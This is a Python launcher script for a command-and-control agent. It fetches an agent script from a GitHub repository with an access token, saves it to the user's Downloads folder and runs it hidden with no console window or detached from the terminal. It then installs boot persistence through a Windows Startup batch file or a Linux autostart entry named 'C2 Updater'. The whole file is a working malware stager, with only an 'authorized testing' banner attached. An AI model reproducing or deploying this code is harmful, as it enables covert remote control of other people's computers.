#!/usr/bin/env python3
"""
C2 Agent Launcher – For Authorized Testing Only
Place this in the Downloads folder and double-click to run.

What it does:
1. Downloads the C2 agent script from your GitHub repo
2. Saves it to the Downloads folder
3. Runs it immediately (silent mode)
4. Installs persistence (survives reboot)
"""

import os
import sys
import time
import urllib.request
import urllib.error
import subprocess
import platform
import base64
import json

# ============================================================
# CONFIGURATION - EDIT THESE
# ============================================================
GITHUB_TOKEN = "orginal"
GITHUB_REPO  = "duuniversity620/final"
AGENT_FILENAME = "c2_agent.py"          # What to name the downloaded file
AGENT_RAW_URL = f"https://api.github.com/repos/{GITHUB_REPO}/contents/c2_agent.py"
# ============================================================

# Detect Downloads folder
if platform.system() == "Windows":
    DOWNLOADS_DIR = os.path.join(os.environ["USERPROFILE"], "Downloads")
elif platform.system() == "Linux" or platform.system() == "Darwin":
    DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
else:
    DOWNLOADS_DIR = os.getcwd()

# Ensure Downloads dir exists
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

AGENT_PATH = os.path.join(DOWNLOADS_DIR, AGENT_FILENAME)
PERSISTENCE_FLAG = os.path.join(DOWNLOADS_DIR, ".c2_installed")  # Marker file


def download_agent():
    """Download the C2 agent script from GitHub to Downloads folder."""
    print("[*] Downloading C2 agent from GitHub...")
    
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3.raw",  # Get raw content directly
        "User-Agent": "python-c2-launcher"
    }
    
    req = urllib.request.Request(AGENT_RAW_URL, headers=headers, method="GET")
    
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        # Fallback: try to get via contents API and decode base64
        print(f"[!] HTTP error {e.code}, trying fallback method...")
        alt_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/c2_agent.py"
        alt_headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "python-c2-launcher"
        }
        alt_req = urllib.request.Request(alt_url, headers=alt_headers, method="GET")
        with urllib.request.urlopen(alt_req, timeout=30) as resp:
            data = json.loads(resp.read().decode())
            content = base64.b64decode(data["content"]).decode("utf-8")
    
    # Write to Downloads folder
    with open(AGENT_PATH, "w", newline="\n") as f:
        f.write(content)
    
    # Make executable on Linux/macOS
    if platform.system() != "Windows":
        os.chmod(AGENT_PATH, 0o755)
    
    print(f"[+] Agent downloaded to: {AGENT_PATH}")
    return True


def run_agent():
    """Execute the agent from Downloads folder with --install flag for persistence."""
    print("[*] Starting C2 agent with persistence installation...")
    
    python_exe = sys.executable
    
    try:
        if platform.system() == "Windows":
            # Windows: run hidden (no console window)
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            proc = subprocess.Popen(
                [python_exe, AGENT_PATH, "--install"],
                cwd=DOWNLOADS_DIR,
                startupinfo=startupinfo,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
        else:
            # Linux/macOS: fork and detach
            pid = os.fork()
            if pid > 0:
                # Parent process: return immediately
                print(f"[+] Agent started (PID: {pid})")
                return True
            # Child process continues
            os.setsid()  # New session
            # Redirect stdio to /dev/null
            devnull = os.open(os.devnull, os.O_RDWR)
            os.dup2(devnull, 0)
            os.dup2(devnull, 1)
            os.dup2(devnull, 2)
            os.close(devnull)
            
            os.execve(python_exe, [python_exe, AGENT_PATH, "--install"], {})
            
    except Exception as e:
        print(f"[!] Failed to start agent: {e}")
        return False
    
    return True


def create_persistence_flag():
    """Create a marker file so we don't re-install on every click."""
    with open(PERSISTENCE_FLAG, "w") as f:
        f.write(f"Installed: {time.ctime()}\n")
        f.write(f"Agent: {AGENT_PATH}\n")


def create_autostart_shortcut():
    """
    Optional: Add this launcher itself to autostart so it re-downloads
    and re-launches the agent on every boot (defense-in-depth persistence).
    """
    launcher_path = os.path.abspath(__file__)
    
    if platform.system() == "Windows":
        # Add to Startup folder
        startup_dir = os.path.join(os.environ["APPDATA"], 
                                    r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_dir, "C2Updater.bat")
        with open(shortcut_path, "w") as f:
            f.write(f'@echo off\nstart /B "" "{python_exe}" "{launcher_path}"\n')
        print(f"[+] Startup shortcut created: {shortcut_path}")
    
    elif platform.system() == "Linux":
        # Add to crontab or autostart
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_entry = f"""[Desktop Entry]
Type=Application
Name=C2 Updater
Exec={sys.executable} {launcher_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
        desktop_path = os.path.join(autostart_dir, "c2-updater.desktop")
        with open(desktop_path, "w") as f:
            f.write(desktop_entry)
        os.chmod(desktop_path, 0o755)
        print(f"[+] Autostart entry created: {desktop_path}")


def main():
    print("=" * 50)
    print("  C2 Agent Launcher - Authorized Testing Only")
    print("=" * 50)
    
    # Step 1: Download agent from GitHub
    if not download_agent():
        print("[!] Download failed. Check your token, repo name, and internet.")
        input("Press Enter to exit...")
        return
    
    # Step 2: Run the agent
    run_agent()
    
    # Step 3: Mark as installed (prevents re-download spam)
    create_persistence_flag()
    
    # Step 4: Optionally create autostart for the launcher itself
    create_autostart_shortcut()
    
    print("\n[+] Done! Agent is running in the background.")
    print(f"[+] Agent location: {AGENT_PATH}")
    print("[+] Commands can be sent via your GitHub repo's command.txt file.")
    
    # On Windows, show a brief message then exit silently
    if platform.system() == "Windows":
        print("\n[!] This window will close automatically.")
        time.sleep(3)


if __name__ == "__main__":
    main()